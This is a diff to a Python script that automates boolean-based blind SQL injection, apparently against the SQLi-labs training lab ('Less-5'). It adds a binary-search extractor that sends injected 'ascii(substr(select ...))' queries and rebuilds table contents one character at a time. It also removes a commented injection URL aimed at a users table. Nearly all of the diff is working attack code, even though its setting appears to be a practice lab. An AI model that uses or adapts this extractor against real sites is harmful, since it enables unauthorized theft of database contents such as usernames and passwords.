@@ -56,9 +56,6 @@ def init_char_list_by_ascii() -> None:
     all_char_ascii_sorted_list = sorted(all_char_ascii_list)
     all_char_sorted_list = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]
 
-def binary_search() -> None:
-    pass
-
 def get_db_name_len(url: str, pattern: str) -> int:
     len: int = 0
     while True:
@@ -246,7 +243,6 @@ def get_data_len(table_and_column_dict: Dict[str, List[str]], table_and_data_num
         data_len_dict[table_name] = column_and_data_len_dict
     return data_len_dict
 
-# TODO
 def get_data(table_column_data_len_dict: Dict[str, Dict[str, List[int]]], pattern: str) -> Dict[str, Dict[str, List[str]]]:
     table_column_data_dict: Dict[str, Dict[str, List[str]]] = {}
     for table_name, column_and_data_len_dict in table_column_data_len_dict.items():
@@ -280,8 +276,70 @@ def get_data(table_column_data_len_dict: Dict[str, Dict[str, List[int]]], patter
         table_column_data_dict[table_name] = column_data_dict
     return table_column_data_dict
 
-# Decoded URL: ?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+
-# print(f"Decoded URL: {url_decoder("?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=68--+")}")
+def binary_search(char_ascii_sorted_list: List[int], target_char_ascii: int) -> int:
+    # Note that the char_ascii_sorted_list must be a sorted arrary with ascending
+    left: int = 0
+    right: int = len(char_ascii_sorted_list) - 1
+    while left <= right:
+        mid: int = (left + right) // 2
+        if char_ascii_sorted_list[mid] == target_char_ascii:
+            return mid
+        elif char_ascii_sorted_list[mid] < target_char_ascii:
+            left = mid + 1
+        else:
+            right = mid - 1
+    return -1
+
+# TODO
+def binary_search_test(sql_url_1:str, sql_url_2: str, pattern: str) -> int:
+    # Note that the char_ascii_sorted_list must be a sorted arrary with ascending
+    left: int = 0
+    right: int = len(all_char_ascii_sorted_list) - 1
+    while left <= right:
+        time.sleep(1)
+        mid: int = (left + right) // 2
+        char_ascii: int = all_char_ascii_sorted_list[mid]
+        url_1: str = ''
+        url_2: str = ''
+        url_1 = LAB_ROOT_URL + sql_url_1 + chr(char_ascii) + SQL_COMMENT
+        url_2 = LAB_ROOT_URL + sql_url_2 + chr(char_ascii) + SQL_COMMENT
+        if get_method(url=url_1, pattern=pattern):
+            print(f'Get the char index successfully: {sql_url_1}')
+            return mid
+        elif get_method(url=url_2, pattern=pattern):
+            left = mid + 1
+            print(f'left = mid + 1, (left, mid, right): ({left, mid, right})')
+        else:
+            print(f'right = mid - 1, (left, mid, right): ({left, mid, right})')
+            right = mid - 1
+    return -1
+
+# TODO
+def get_data_with_binary_search(table_column_data_len_dict: Dict[str, Dict[str, List[int]]], pattern: str) -> Dict[str, Dict[str, List[str]]]:
+    table_column_data_dict: Dict[str, Dict[str, List[str]]] = {}
+    for table_name, column_and_data_len_dict in table_column_data_len_dict.items():
+        column_data_dict: Dict[str, List[str]] = {}
+        for column_name, data_len_list in column_and_data_len_dict.items():
+            data_str_list: List[str] = []
+            limit_begin_index: int = 0
+            for data_len in data_len_list:
+                data_str: str = ''
+                substr_begin_index: int = 1
+                while len(data_str) < data_len:
+                    url_str_1: str = f"/Less-5/?id=1' and ascii(substr((select {column_name} from {table_name} limit {limit_begin_index},1), {substr_begin_index},1)) ="
+                    url_str_2: str = f"/Less-5/?id=1' and ascii(substr((select {column_name} from {table_name} limit {limit_begin_index},1), {substr_begin_index},1)) >"
+                    data_char_ascii_index: int = binary_search_test(sql_url_1=url_str_1, sql_url_2=url_str_2, pattern=pattern)
+                    if data_char_ascii_index == -1:
+                        print(f'Not found the index of data char')
+                    else:
+                        data_char_ascii = all_char_ascii_sorted_list[data_char_ascii_index]
+                        data_str = data_str + chr(data_char_ascii)
+                        substr_begin_index = substr_begin_index + 1
+                data_str_list.append(data_str)
+                limit_begin_index = limit_begin_index + 1
+            column_data_dict[column_name] = data_str_list
+        table_column_data_dict[table_name] = column_data_dict
+    return table_column_data_dict
 
 # db_name_len: int = get_db_name_len(url="/Less-5/?id=1'and length(database())=")
 # print(f'The db name length: {db_name_len}')
@@ -417,3 +475,14 @@ for table_name, column_and_data_dict in table_column_data_dict.items():
         print(f'\tcolumn name: {column_name}')
         for data in data_list:
             print(f'\t\tdata: {data}')
+print('\n\n')
+
+# TODO
+table_column_data_dict_2: Dict[str, Dict[str, List[str]]] = get_data_with_binary_search(table_column_data_len_dict=table_column_data_len_dict, pattern='You are in')
+for table_name, column_and_data_dict in table_column_data_dict_2.items():
+    print(f'table name: {table_name}')
+    for column_name, data_list in column_and_data_dict.items():
+        print(f'\tcolumn name: {column_name}')
+        for data in data_list:
+            print(f'\t\tdata: {data}')
+print('\n\n')
